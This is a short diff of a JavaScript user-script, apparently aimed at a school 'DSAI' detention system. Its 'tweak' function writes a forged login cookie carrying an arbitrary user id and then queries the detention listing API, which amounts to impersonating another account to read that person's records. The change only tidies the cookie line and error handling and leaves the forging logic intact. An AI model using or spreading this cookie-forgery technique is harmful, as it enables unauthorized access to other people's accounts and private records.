@@ -18,7 +18,7 @@ function log(info){
 function tweak(id){
     log("Tweaking "+id);
     /*Create fake login cookie*/
-    document.cookie="DSAI="+id+";expires="+date.toGMTString()+";path=/";
+    document.cookie="DSAI="+id+";path=/";
     /*Fetch API to get new tweaked session*/
     log("Detention API returned:");
     fetch(window.location.origin+'/DSAI/Query/Form_ListDetention?strKeyWord1=')
@@ -29,7 +29,7 @@ function tweak(id){
             alert(id+' seems not exist. Check your spelling.');
             return;
         }
-        alert("Error while tweaking "+id+"! "+error);successed=false;
+        alert("Error while tweaking "+id+"! "+error);
     }()))
 }
 /* Visual interface (Tweaking DOM) */
